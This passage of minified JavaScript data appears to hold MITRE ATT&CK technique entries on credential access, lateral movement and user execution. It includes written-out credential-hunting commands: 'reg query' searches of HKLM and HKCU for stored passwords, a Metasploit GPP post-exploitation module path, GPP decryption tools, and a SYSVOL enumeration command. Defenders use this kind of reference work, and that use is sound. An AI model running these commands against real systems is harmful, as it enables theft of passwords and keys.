credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code\u002Fbinary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fcarnal0wnage.attackresearch.com\u002F2014\u002F05\u002Fmimikatz-against-virtual-machine-memory.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblogs.technet.com\u002Fb\u002Fsrd\u002Farchive\u002F2014\u002F05\u002F13\u002Fms14-025-an-update-for-group-policy-preferences.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn cloud and\u002For containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fhildegard-malware-teamtnt\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E They may also be found as parameters to deployment commands in container logs.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fattackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fhead-in-the-clouds-bd038bb69e48'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";GH.external_references=[{source_name:b,external_id:GI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F001"},{external_id:ph,source_name:c,url:pi},{url:"http:\u002F\u002Fcarnal0wnage.attackresearch.com\u002F2014\u002F05\u002Fmimikatz-against-virtual-machine-memory.html",description:"CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.",source_name:"CG 2014"},{url:"http:\u002F\u002Fblogs.technet.com\u002Fb\u002Fsrd\u002Farchive\u002F2014\u002F05\u002F13\u002Fms14-025-an-update-for-group-policy-preferences.aspx",description:"Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.",source_name:"SRD GPP"},{source_name:fv,url:fw,description:fx},{source_name:GE,url:GF,description:GG},{source_name:"Specter Ops - Cloud Credential Storage",url:"https:\u002F\u002Fposts.specterops.io\u002Fhead-in-the-clouds-bd038bb69e48",description:"Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved October 4, 2019."}];GH["subtechnique-of"]=X;GJ.id=GK;GJ["object-type"]=a;GJ.name="Credentials in Registry";GJ.description="Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \u003Csup\u003E\u003Ca href='https:\u002F\u002Fpentestlab.blog\u002F2017\u002F04\u002F19\u002Fstored-credentials\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* Local Machine Hive: \u003Ccode\u003Ereg query HKLM \u002Ff password \u002Ft REG_SZ \u002Fs\u003C\u002Fcode\u003E\n* Current User Hive: \u003Ccode\u003Ereg query HKCU \u002Ff password \u002Ft REG_SZ \u002Fs\u003C\u002Fcode\u003E";GJ.external_references=[{source_name:b,external_id:GK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F002"},{url:"https:\u002F\u002Fpentestlab.blog\u002F2017\u002F04\u002F19\u002Fstored-credentials\u002F",description:"netbiosX. (2017, April 19). Stored Credentials. Retrieved April 6, 2018.",source_name:"Pentestlab Stored Credentials"}];GJ["subtechnique-of"]=X;GL.id=GM;GL["object-type"]=a;GL.name="Group Policy Preferences";GL.description="Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fdn581922(v%3Dws.11)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc422924.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \u003Ccode\u003Epost\u002Fwindows\u002Fgather\u002Fcredentials\u002Fgpp\u003C\u002Fcode\u003E\n* Get-GPPPassword\u003Csup\u003E\u003Ca href='https:\u002F\u002Fobscuresecurity.blogspot.co.uk\u002F2012\u002F05\u002Fgpp-password-retrieval-with-powershell.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: \u003Ccode\u003Edir \u002Fs * .xml\u003C\u002Fcode\u003E\n";GL.external_references=[{source_name:b,external_id:GM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F006"},{source_name:"Microsoft GPP 2016",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fdn581922(v%3Dws.11)",description:"Microsoft. (2016, August 31). Group Policy Preferences. Retrieved March 9, 2020."},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc422924.aspx",description:"Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018.",source_name:"Microsoft GPP Key"},{url:"https:\u002F\u002Fobscuresecurity.blogspot.co.uk\u002F2012\u002F05\u002Fgpp-password-retrieval-with-powershell.html",description:"Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018.",source_name:"Obscuresecurity Get-GPPPassword"},{description:"Sean Metcalf. (2015, December 28). Finding Passwords in SYSVOL & Exploiting Group Policy Preferences. Retrieved February 17, 2020.",url:"https:\u002F\u002Fadsecurity.org\u002F?p=2288",source_name:"ADSecurity Finding Passwords in SYSVOL"}];GL["subtechnique-of"]=X;GN.id=GO;GN["object-type"]=a;GN.name="Private Keys";GN.description="Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption\u002Fdecryption, and digital signatures.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FPublic-key_cryptography'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as \u003Ccode\u003E~\u002F.ssh\u003C\u002Fcode\u003E for SSH keys on * nix-based systems or \u003Ccode\u003EC:&#92;Users&#92;(username)&#92;.ssh&#92;\u003C\u002Fcode\u003E on Windows. These private keys can be used to authenticate to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021'\u003ERemote Services\u003C\u002Fa\u003E like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002Fvlpdfs\u002Funveilingthemask_v1.0.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F06\u002Funit42-prince-of-persia-game-over\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSome private keys require a password or passphrase for operation, so an adversary may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056'\u003EInput Capture\u003C\u002Fa\u003E for keylogging or attempt to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E the passphrase off-line.";GN.external_references=[{source_name:b,external_id:GO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FPublic-key_cryptography",description:"Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.",source_name:"Wikipedia Public Key Crypto"},{url:"https:\u002F\u002Fkasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002Fvlpdfs\u002Funveilingthemask_v1.0.pdf",description:"Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.",source_name:"Kaspersky Careto"},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F06\u002Funit42-prince-of-persia-game-over\u002F",description:"Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.",source_name:"Palo Alto Prince of Persia"}];GN["subtechnique-of"]=X;GQ.id=GR;GQ["object-type"]=a;GQ.name="Application Access Token";GQ.description="Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fauth0.com\u002Fblog\u002Fwhy-should-use-accesstokens-to-secure-an-api\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.okta.com\u002Fblog\u002F2018\u002F06\u002F20\u002Fwhat-happens-if-your-jwt-is-stolen'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Faccess-tokens'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fstaaldraad.github.io\u002F2017\u002F08\u002F02\u002Fo356-phishing-with-oauth\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.";GQ.external_references=[{source_name:b,external_id:GR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F001"},{external_id:"CAPEC-593",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F593.html"},{description:ER,url:ES,source_name:ET},{description:"okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved September 12, 2019.",url:"https:\u002F\u002Fdeveloper.okta.com\u002Fblog\u002F2018\u002F06\u002F20\u002Fwhat-happens-if-your-jwt-is-stolen",source_name:"okta"},{description:"Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27). Microsoft identity platform access tokens. Retrieved October 4, 2019.",url:EU,source_name:"Microsoft Identity Platform Access 2019"},{description:"Stalmans, E.. (2017, August 2). Phishing with OAuth and o365\u002FAzure. Retrieved October 4, 2019.",url:"https:\u002F\u002Fstaaldraad.github.io\u002F2017\u002F08\u002F02\u002Fo356-phishing-with-oauth\u002F",source_name:"Staaldraad Phishing with OAuth 2017"}];GQ["subtechnique-of"]=bg;GS.id=GT;GS["object-type"]=a;GS.name="Pass the Hash";GS.description="Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0006'\u003ECredential Access\u003C\u002Fa\u003E technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F003'\u003EPass the Ticket\u003C\u002Fa\u003E attacks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fstealthbits.com\u002Fblog\u002Fhow-to-detect-overpass-the-hash-attacks\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";GS.external_references=[{source_name:b,external_id:GT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F002"},{external_id:"CAPEC-644",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F644.html"},{source_name:GU,url:GV,description:GW}];GS["subtechnique-of"]=bg;GX.id=GY;GX["object-type"]=a;GX.name="Pass the Ticket";GX.description="Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E are captured by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=556'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.gentilkiwi.com\u002Fsecurite\u002Fmimikatz\u002Fpass-the-ticket-kerberos'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F002'\u003ESilver Ticket\u003C\u002Fa\u003E can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=556'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F001'\u003EGolden Ticket\u003C\u002Fa\u003E can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fdefcon.org\u002Fimages\u002Fdefcon-22\u002Fdc-22-presentations\u002FCampbell\u002FDEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F002'\u003EPass the Hash\u003C\u002Fa\u003E) while also using the password hash to create a valid Kerberos ticket.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fstealthbits.com\u002Fblog\u002Fhow-to-detect-overpass-the-hash-attacks\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";GX.external_references=[{source_name:b,external_id:GY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F003"},{external_id:"CAPEC-645",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F645.html"},{url:"https:\u002F\u002Fadsecurity.org\u002F?p=556",description:"Metcalf, S. (2014, November 22). Mimikatz and Active Directory Kerberos Attacks. Retrieved June 2, 2016.",source_name:"ADSecurity AD Kerberos Attacks"},{url:"http:\u002F\u002Fblog.gentilkiwi.com\u002Fsecurite\u002Fmimikatz\u002Fpass-the-ticket-kerberos",description:"Deply, B. (2014, January 13). Pass the ticket. Retrieved June 2, 2016.",source_name:"GentilKiwi Pass the Ticket"},{url:"http:\u002F\u002Fdefcon.org\u002Fimages\u002Fdefcon-22\u002Fdc-22-presentations\u002FCampbell\u002FDEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf",description:"Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December 4, 2014.",source_name:"Campbell 2014"},{source_name:GU,url:GV,description:GW},{url:gu,description:gv,source_name:gw}];GX["subtechnique-of"]=bg;GZ.id=G_;GZ["object-type"]=a;GZ.name="Web Session Cookie";GZ.description="Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1539'\u003ESteal Web Session Cookie\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1606\u002F001'\u003EWeb Cookies\u003C\u002Fa\u003E, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fmac-malware-steals-cryptocurrency-exchanges-cookies\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";GZ.external_references=[{source_name:b,external_id:G_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F004"},{external_id:"CAPEC-60",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F60.html"},{description:cS,url:cT,source_name:cU},{source_name:cV,url:cW,description:cX}];GZ["subtechnique-of"]=bg;G$.id=Ha;G$["object-type"]=a;G$.name="Malicious File";G$.description="An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001'\u003ESpearphishing Attachment\u003C\u002Fa\u003E. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E on the file to increase the likelihood that a user will open it.\n\nWhile \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F002'\u003EMalicious File\u003C\u002Fa\u003E frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1534'\u003EInternal Spearphishing\u003C\u002Fa\u003E.";G$.external_references=[{source_name:b,external_id:Ha,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F002"}];G$["subtechnique-of"]=bV;Hb.id=Hc;Hb["object-type"]=a;Hb.name="Malicious Image";Hb.description="Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F001'\u003EUpload Malware\u003C\u002Fa\u003E, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsummitroute.com\u002Fblog\u002F2018\u002F09\u002F24\u002Finvestigating_malicious_amis\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036\u002F005'\u003EMatch Legitimate Name or Location\u003C\u002Fa\u003E).";Hb.external_references=[{source_name:b,external_id:Hc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F003"},{source_name:"Summit Route Malicious AMIs",url:"https:\u002F\u002Fsummitroute.com\u002Fblog\u002F2018\u002F09\u002F24\u002Finvestigating_malicious_amis\u002F",description:"Piper, S.. (2018, September 24). Investigating Malicious AMIs. Retrieved March 30, 2021."}];Hb["subtechnique-of"]=bV;Hd.id=He;Hd["object-type"]=a;Hd.name="Malicious Link";Hd.description="An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002'\u003ESpearphishing Link\u003C\u002Fa\u003E. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1203'\u003EExploitation for Client Execution\u003C\u002Fa\u003E. Links may also lead users to download files that require execution via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F002'\u003EMalicious File\u003C\u002Fa\u003E.";Hd.external_references=[{source_name:b,external_id:He,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204\u002F001"}];Hd["subtechnique-of"]=bV;Hk.id=Hl;Hk["object-type"]=a;Hk.name="Cloud Accounts";Hk.description="Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. \u003Csup\u003E\u003Ca href='https:\u002F\u002Faws.amazon.com\u002Fidentity\u002Ffederation\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fsolutions\u002Ffederating-gcp-with-active-directory-introduction'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fidentity\u002Fad-fs\u002Fdeployment\u002Fhow-to-connect-fed-azure-adfs'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F002'\u003EDomain Accounts\u003C\u002Fa\u003E, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.";Hk.external_references=[{source_name:b,external_id:Hl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F004"},{source_name:"AWS Identity Federation",url:"https:\u002F\u002Faws.amazon.com\u002Fidentity\u002Ffederation\u002F",description:"Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020."},{source_name:"Google Federating GC",url:"https:\u002F\u002Fcloud.google.com\u002Fsolutions\u002Ffederating-gcp-with-active-directory-introduction",description:"Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020."},{source_name:"Microsoft Deploying AD Federation",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fidentity\u002Fad-fs\u002Fdeployment\u002Fhow-to-connect-fed-azure-adfs",description:"Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020."}];Hk["subtechnique-of"]=Y;Hm.id=Hn;Hm["object-type"]=a;Hm.name="Default Accounts";Hm.description="Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory\u002Fprovider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Faccess-control\u002Flocal-accounts'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002FIAM\u002Flatest\u002FUserGuide\u002Fid_root-user.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2020\u002F04\u002F02\u002Fattack-matrix-kubernetes\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004'\u003EPrivate Keys\u003C\u002Fa\u003E or credential materials to legitimately connect to remote environments via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021'\u003ERemote Services\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Frapid7\u002Fmetasploit-framework\u002Ftree\u002Fmaster\u002Fmodules\u002Fexploits\u002Flinux\u002Fssh'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Hm.external_references=[{source_name:b,external_id:Hn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078\u002F001"},{external_id:"CAPEC-70",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F70.html"},{source_name:"Microsoft Local Accounts Feb 2019",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fidentity-protection\u002Faccess-control\u002Flocal-accounts",description:"Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019."},{source_name:"AWS Root User",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002FIAM\u002Flatest\u002FUserGuide\u002Fid_root-user.html",description:"Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021."},{source_name:Ct,url:Cu,description:Cv},{source_name:"Metasploit SSH Module",url:"https:\u002F\u002Fgithub.com\u002Frapid7\u002Fmetasploit-framework\u002Ftree\u002Fmaster\u002Fmodules\u002Fexploits\u002Flinux\u002Fssh",description:"Metasploit. (n.d.). Retrieved April 12, 2019."}];Hm["subtechnique-of"]=Y;Ho.id=Hp;Ho["object-type"]=a;Ho.name="Domain Accounts";Ho.description="Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn535501.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that 